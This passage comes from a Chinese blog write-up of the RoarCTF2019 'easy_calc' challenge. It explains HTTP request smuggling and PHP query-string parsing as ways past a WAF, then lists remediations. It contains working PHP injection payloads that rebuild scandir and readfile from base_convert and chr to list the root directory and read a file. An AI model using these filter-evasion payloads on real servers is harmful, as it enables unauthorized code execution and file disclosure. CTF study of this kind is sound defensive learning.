+<p>‘ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`‘, ‘[‘, ‘]’等字符</p>
+</blockquote>
+<p>师傅的Writeup还说网站加了waf，需要绕过waf。所以还需要绕过waf，测试发现当我们提交一些字符时，会直接<code>403</code>。<code>403</code>？！应该就是走私报错了，经测试发现的确存在服务器存在http走私漏洞，可以用来绕waf。</p>
+<p>因禁了一些字符，所以不能直接getflag，需要继续分析payload构造。</p>
+<h5 id="相关PHP函数"><a href="#相关PHP函数" class="headerlink" title="相关PHP函数"></a>相关PHP函数</h5><p><strong>scandir() 函数</strong><br>返回指定目录中的文件和目录的数组。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235429.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<p><strong>base_convert() 函数</strong><br>在任意进制之间转换数字。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235429.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<p><strong>dechex() 函数</strong>：把十进制转换为十六进制。<br><strong>hex2bin() 函数</strong>：把十六进制值的字符串转换为 ASCII 字符。<br><strong>readfile() 函数</strong><br>输出一个文件。<br>该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235435.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<h5 id="HTTP走私绕过WAF"><a href="#HTTP走私绕过WAF" class="headerlink" title="HTTP走私绕过WAF"></a>HTTP走私绕过WAF</h5><p><strong>测试示例</strong><br><em>1、HTTP请求走私测试2(CL-CL漏洞)</em><br>两个CL直接导致前端转发的服务器400，而且完整转发了post包给后端。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235435.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<p><em>2、HTTP请求走私测试1(CL-TE漏洞)</em><br>CL和TE直接导致前端转发的服务器400，而且完整转发了post包给后端。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235435.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<p>其它几种请求走私依旧可以，就不测试了。</p>
+<p><strong>构造payload获得Flag</strong><br>使用<code>scandir()函数</code>、<code>readfile()函数</code>、<code>base_convert()函数</code>、<code>dechex() 函数</code>、<code>hex2bin() 函数</code>（<code>chr()函数</code>）<br>36进制<code>scandir</code>-&gt;10进制61693386291<br>36进制<code>readfile</code>-&gt;10进制2146934604002<br>ascii码<code>/</code>-&gt;16进制2f-&gt;10进制47<br>36进制f1agg-&gt;10进制25254448(读取根目录得到的)<br><em>1、列目录</em><br>首先要使用<code>scandir()函数</code>，尝试构造payload列举根目录下的文件。<br><code>scandir()</code>可以用<code>base_convert()函数</code>构造，但是利用<code>base_convert()</code>只能解决<code>a~z</code>的利用。<br>因为根目录需要<code>/</code>符号，且不在<code>a~z</code>,所以需要<code>hex2bin(dechex(47))</code>这种构造方式，<code>dechex() 函数</code>把十进制数转换为十六进制数。<code>hex2bin() 函数</code>把十六进制值的字符串转换为 ASCII 字符。当然，也可以直接用<code>chr()函数</code></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(base_convert(61693386291,10,36)(chr(47)))</span><br><span class="line">bash复制代码</span><br><span class="line">bash复制代码</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235435.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<p><em>2、读取flag</em></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36)))</span><br><span class="line">bash复制代码</span><br><span class="line">bash复制代码</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235435.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<h5 id="PHP字符串解析特性绕过WAF"><a href="#PHP字符串解析特性绕过WAF" class="headerlink" title="PHP字符串解析特性绕过WAF"></a>PHP字符串解析特性绕过WAF</h5><p>输入时发现num只能输入数字，输入字符无法解析。<br>这里可以利用php的字符串解析特性绕过bypass：<a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></p>
+<blockquote>
+<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>1.删除空白符<br>2.将某些字符转换为下划线（包括空格）</p>
+</blockquote>
+<p>所以我们可以在num前加个空格绕过waf</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php? num&#x3D;aaaa</span><br><span class="line">php复制代码</span><br><span class="line">php复制代码</span><br></pre></td></tr></table></figure>
+
+<p>现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码还能正常运行，还上传了非法字符。<br>然后再利用<code>scandir()</code>函数，列出 <code>参数目录</code> 中的文件和目录。<br>首先，要先扫根目录下的所有文件，也就是是<code>scandir(&quot;/&quot;)</code>,因为<code>/</code>被过滤了，所以直接用<code>chr(“47”)</code>绕过,发现<code>flagg文件</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235435.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<p>然后再去读取这个文件就行了。payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calc.php? num&#x3D;1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br><span class="line">php复制代码</span><br><span class="line">php复制代码</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210423235438.png" alt="在这里插入图片描述"></p>
+<p>在这里插入图片描述</p>
+<h3 id="0x06-漏洞修复"><a href="#0x06-漏洞修复" class="headerlink" title="0x06 漏洞修复"></a>0x06 漏洞修复</h3><p>1、将前端服务器配置为只使用HTTP/2与后端系统通信<br>2、完全禁用后端连接重用来解决此漏洞的所有变体<br>3、确保连接中的所有服务器运行具有相同配置的相同web服务器软件。<br>4、彻底拒绝模糊的请求，并删除关联的连接。<br>5、在Burp Suite中，你可以使用Repeater菜单禁用此行为，确保你选择的工具具有相同的功能。<br>6、通过Squid之类的代理来测试他们的测试人员的流量以进行监控。破坏测试人员发起的任何走私攻击请求，确保对此漏洞做到全面杜绝。</p>
+<h3 id="0x07-写在后面"><a href="#0x07-写在后面" class="headerlink" title="0x07 写在后面"></a>0x07 写在后面</h3><p>这次又学到了新的知识-HTTP请求走私。了解了HTTP请求走私的五种方式，以及一些PHP函数的使用。HTTP请求走私属于协议层攻击，是服务器漏洞的一种，应予以注意。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">upload</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://upload.love/2021/04/23/HTTP%E8%B5%B0%E7%A7%81/">http://upload.love/2021/04/23/HTTP%E8%B5%B0%E7%A7%81/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://upload.love" target="_blank">upload</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/image/buu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/24/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97WEBSHELL/"><img class="prev-cover" data-lazy-src="/image/buu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">无字母数字WEBSHELL</div></div></a></div><div class="next-post pull-right"><a href="/2021/04/23/xpath%E6%B3%A8%E5%85%A5/"><img class="next-cover" data-lazy-src="/image/buu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">xpath注入</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">upload</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%88%B0HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">1.</span> <span class="toc-text">从一道题到HTTP请求走私</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.0.1.</span> <span class="toc-text">0x00 写在前面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.0.2.</span> <span class="toc-text">0x01 HTTP请求走私是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E4%BA%A7%E7%94%9FHTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">1.0.3.</span> <span class="toc-text">0x02 为什么会产生HTTP请求走私</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E8%AF%B7%E6%B1%82"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">扩展：为什么会出现多次请求</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8CHTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.4.</span> <span class="toc-text">0x03 如何执行HTTP请求走私攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB%E7%9A%84%E4%BA%94%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.5.</span> <span class="toc-text">0x04 HTTP请求走私攻击的五种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CL%E4%B8%8D%E4%B8%BA0"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">CL不为0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CL-CL"><span class="toc-number">1.0.5.2.</span> <span class="toc-text">CL-CL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CL-TE"><span class="toc-number">1.0.5.3.</span> <span class="toc-text">CL-TE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TE-CL"><span class="toc-number">1.0.5.4.</span> <span class="toc-text">TE-CL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TE-TE"><span class="toc-number">1.0.5.5.</span> <span class="toc-text">TE-TE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AE%9E%E6%88%98"><span class="toc-number">1.0.6.</span> <span class="toc-text">0x05 HTTP请求走私实战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RoarCTF2019-Web%EF%BC%9Aeasy-calc"><span class="toc-number">1.0.6.1.</span> <span class="toc-text">RoarCTF2019-Web：easy_calc</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3PHP%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.6.1.1.</span> <span class="toc-text">相关PHP函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP%E8%B5%B0%E7%A7%81%E7%BB%95%E8%BF%87WAF"><span class="toc-number">1.0.6.1.2.</span> <span class="toc-text">HTTP走私绕过WAF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87WAF"><span class="toc-number">1.0.6.1.3.</span> <span class="toc-text">PHP字符串解析特性绕过WAF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.0.7.</span> <span class="toc-text">0x06 漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="toc-number">1.0.8.</span> <span class="toc-text">0x07 写在后面</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计4"/></a><div class="content"><a class="title" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4">java代码审计4</a><time datetime="2021-11-08T08:49:09.000Z" title="发表于 2021-11-08 16:49:09">2021-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计3"/></a><div class="content"><a class="title" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3">java代码审计3</a><time datetime="2021-11-05T02:37:46.000Z" title="发表于 2021-11-05 10:37:46">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计2"/></a><div class="content"><a class="title" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2">java代码审计2</a><time datetime="2021-11-01T13:08:39.000Z" title="发表于 2021-11-01 21:08:39">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="东华杯"/></a><div class="content"><a class="title" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯">东华杯</a><time datetime="2021-11-01T04:27:51.000Z" title="发表于 2021-11-01 12:27:51">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计1"/></a><div class="content"><a class="title" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1">java代码审计1</a><time datetime="2021-10-31T08:49:36.000Z" title="发表于 2021-10-31 16:49:36">2021-10-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By upload</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://upload.love/2021/04/23/HTTP%E8%B5%B0%E7%A7%81/'
+    this.page.identifier = '2021/04/23/HTTP走私/'
+    this.page.title = 'HTTP走私'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
